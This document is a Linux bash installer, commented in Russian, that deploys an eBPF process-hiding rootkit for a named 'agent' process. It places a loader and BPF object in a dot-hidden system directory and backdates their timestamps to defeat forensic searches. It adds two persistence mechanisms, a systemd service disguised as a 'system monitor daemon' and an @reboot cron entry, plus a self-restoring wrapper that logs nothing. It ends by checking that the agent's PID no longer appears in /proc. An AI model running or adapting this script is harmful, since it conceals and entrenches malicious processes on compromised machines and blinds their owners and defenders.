#!/bin/bash
# hide_install.sh - установка eBPF-сокрытия рядом с агентом (Linux, root).
#
#   hide_install.sh [имя_процесса_агента]     по умолчанию: sysdiag
#
# Рядом со скриптом должны лежать два артефакта: sysmond (загрузчик) и
# hide.bpf.o (объект, собранный под BTF целевого ядра - см. README).
# Ставит ДВА независимых механизма на один payload (systemd + /etc/cron.d),
# оба зовут один wrapper, который каждый раз заново резолвит PID агента:
# агент может перезапуститься, а сокрытие обязано вернуться.
set -euo pipefail

AGENT_NAME="${1:-sysdiag}"
AGENT_UNIT="${AGENT_UNIT:-systemd-sysdiag.service}"
SRC_DIR="$(cd "$(dirname "$0")" && pwd)"
DEST=/usr/lib/.wdcd/bin
BIN=$DEST/sysmond
OBJ=$DEST/sysmond.bpf.o
RUN=$DEST/sysmond-run
UNIT=/etc/systemd/system/sysmond.service
CRON=/etc/cron.d/sysmond

[ "$(id -u)" = 0 ] || { echo "ОШИБКА: нужен root"; exit 1; }

# PID агента снимаем ДО запуска хайдера: после сокрытия его не найдёт ни pgrep,
# ни ps, ни pkill (все они читают /proc) — проверка иначе врёт "агент не найден".
# Источник истины — MainPID юнита агента: pgrep по имени ловит ЧУЖОЙ процесс с тем
# же именем (в живых лабах рядом крутится второй sysdiag), и сокрытие уезжает не туда.
AGENT_PID=$(systemctl show -p MainPID --value "$AGENT_UNIT" 2>/dev/null || true)
case "${AGENT_PID:-0}" in ''|0|*[!0-9]*) AGENT_PID="";; esac
if [ -z "$AGENT_PID" ]; then
  AGENT_PID=$(pgrep -x "$AGENT_NAME" | head -1 || true)
fi
if [ -z "$AGENT_PID" ]; then
  for p in /proc/[0-9]*; do
    if [ "$(cat "$p/comm" 2>/dev/null)" = "$AGENT_NAME" ]; then AGENT_PID="${p#/proc/}"; break; fi
  done
fi
echo "== 0. агент $AGENT_NAME: pid=${AGENT_PID:-НЕ НАЙДЕН (не запущен)} =="

echo "== 1. предусловие: CAP_BPF/CAP_SYS_ADMIN и BTF =="
CAPEFF=$(awk '/^CapEff/{print $2}' /proc/self/status)
if (( (16#$CAPEFF & ((1<<21) | (1<<39))) == 0 )); then
  echo "СТОП: в текущем контексте нет ни CAP_SYS_ADMIN (21), ни CAP_BPF (39)."
  echo "      BPF здесь не загрузится ничем — это стена окружения, а не баг модуля"
  echo "      (дефолтный docker-набор cap 00000000a80425fb её не проходит)."
  exit 2
fi
[ -s /sys/kernel/btf/vmlinux ] || echo "предупреждение: нет /sys/kernel/btf/vmlinux (BTF ядра)"
[ -s "$SRC_DIR/sysmond" ] || { echo "ОШИБКА: рядом нет sysmond"; exit 1; }
[ -s "$SRC_DIR/hide.bpf.o" ] || { echo "ОШИБКА: рядом нет hide.bpf.o"; exit 1; }

echo "== 2. tracefs: загрузчику нужен id трейс-поинта из tracefs =="
if [ ! -e /sys/kernel/tracing/events/syscalls/sys_enter_getdents64/id ] &&
   [ ! -e /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/id ]; then
  mkdir -p /sys/kernel/tracing
  mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null || true
  if [ ! -e /sys/kernel/tracing/events/syscalls/sys_enter_getdents64/id ]; then
    echo "СТОП: tracefs недоступен — загрузчик не сможет прицепить программы"
    echo "      (в контейнере нужен смонтированный /sys/kernel/tracing)"
    exit 3
  fi
  echo "-- tracefs смонтирован"
fi

echo "== 3. раскладка payload (0700 root, дотированный каталог) =="
install -d -m 0700 -o root -g root "$DEST"
install -m 0700 -o root -g root "$SRC_DIR/sysmond" "$BIN"
install -m 0600 -o root -g root "$SRC_DIR/hide.bpf.o" "$OBJ"
[ -s "$BIN" ] && [ -s "$OBJ" ] || { echo "ОШИБКА: payload пустой"; exit 1; }
# mtime в прошлое: свежие файлы (mtime сегодня) выдаются одним find по новизне. Ставим
# как у /etc/os-release — системный референс установки ОС.
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
[ "$_stamp" -gt 0 ] 2>/dev/null && touch -d "@$_stamp" "$DEST" "$BIN" "$OBJ" 2>/dev/null || true

cat > "$RUN" <<EOF
#!/bin/sh
# Цикл, а не exec: агент может перезапуститься (или хайдера могут убить) —
# каждый виток заново резолвит PID и возвращает сокрытие без внешнего надзора.
# Лог идёт в /dev/null: не оставляем на диске файл с текстом «скрываем PID».
while :; do
  PID=\$(systemctl show -p MainPID --value $AGENT_UNIT 2>/dev/null)
  case "\$PID" in ''|0|*[!0-9]*) PID="";; esac
  [ -n "\$PID" ] || PID=\$(pgrep -x $AGENT_NAME | head -1)
  [ -n "\$PID" ] || PID=\$(for p in /proc/[0-9]*; do
      [ "\$(cat \$p/comm 2>/dev/null)" = "$AGENT_NAME" ] && { echo "\${p#/proc/}"; break; }
    done)
  if [ -z "\$PID" ]; then sleep 1; continue; fi
  $BIN -obj $OBJ -watch -pid "\$PID" >/dev/null 2>&1
  sleep 1
done
EOF
chmod 0700 "$RUN"

echo "== 4. механизм 1: systemd =="
cat > "$UNIT" <<EOF
[Unit]
Description=system monitor daemon
After=multi-user.target

[Service]
Type=simple
ExecStart=$RUN
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
chmod 0644 "$UNIT"

echo "== 5. механизм 2: cron.d (отложенный, с проверкой singleton) =="
cat > "$CRON" <<EOF
@reboot root sleep 60; pgrep -x sysmond >/dev/null || $RUN >/dev/null 2>&1
EOF
chmod 0644 "$CRON"

# Юнит, cron и wrapper тоже в прошлое — иначе find по свежести в /etc выдаёт весь набор.
[ "$_stamp" -gt 0 ] 2>/dev/null && touch -d "@$_stamp" "$RUN" "$UNIT" "$CRON" 2>/dev/null || true

# Обёртки прошлых установок не перечитывают обновлённый скрипт, а запущенные через setsid
# вообще живут вне юнита — снимаем их ПЕРЕД стартом. Иначе после апгрейда работает старая
# версия (с прежним путём лога): файл на диске новый, а процесс — старый.
pkill -f "$RUN" 2>/dev/null || true
pkill -x sysmond 2>/dev/null || true
sleep 1

if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
  systemctl daemon-reload
  systemctl enable sysmond.service
  # restart, а не enable --now: уже активный юнит не перезапускается, и на цели остаётся
  # жить старый процесс обёртки.
  systemctl restart sysmond.service
  sleep 3
  echo "-- статус юнита: $(systemctl is-active sysmond.service)"
  echo "-- pid обёртки: $(systemctl show -p MainPID --value sysmond.service)"
else
  echo "-- systemd не активен в этом окружении: запускаю wrapper напрямую"
  setsid "$RUN" </dev/null >/dev/null 2>&1 &
  sleep 3
fi

echo "== 6. проверка сокрытия (три условия, по PID, снятому до установки) =="
PID="$AGENT_PID"
echo "агент $AGENT_NAME: pid=$PID"
if [ -z "$PID" ]; then
  echo "агент не был запущен ДО установки — сокрытие проверить нечем"
  exit 0
fi
kill -0 "$PID" 2>/dev/null && echo "1) агент РАБОТАЕТ: да" || echo "1) агент жив: НЕТ"
# Загрузчик приатачивается асинхронно (загрузка eBPF + заполнение tail-call слотов), поэтому
# проверка «сразу после старта юнита» даёт ложный негатив — а на медленной машине и ложный
# негатив в отчёте хуже, чем отсутствие отчёта. Ждём до 15 с; если так и не скрылось — код 1,
# и deploy не отчитается об успехе.
HIDDEN=0; WAITED=0
while [ "$WAITED" -lt 15 ]; do
  if ! ls /proc | grep -qx "$PID"; then HIDDEN=1; break; fi
  sleep 1; WAITED=$((WAITED + 1))
done
if [ "$HIDDEN" = 1 ]; then
  echo "2) агент НЕ виден в ls /proc: ДА (сокрытие поднялось за ~${WAITED}с)"
else
  echo "2) СКРЫТИЕ НЕ РАБОТАЕТ: агент виден в ls /proc после 15с ожидания"
fi
ls /proc | grep -qx 1 && echo "3) /proc не сломан (PID 1 виден): да" || echo "3) /proc сломан: НЕТ"
echo "прямой /proc/$PID/comm: $(cat /proc/$PID/comm 2>/dev/null)"
[ "$HIDDEN" = 1 ] || exit 1
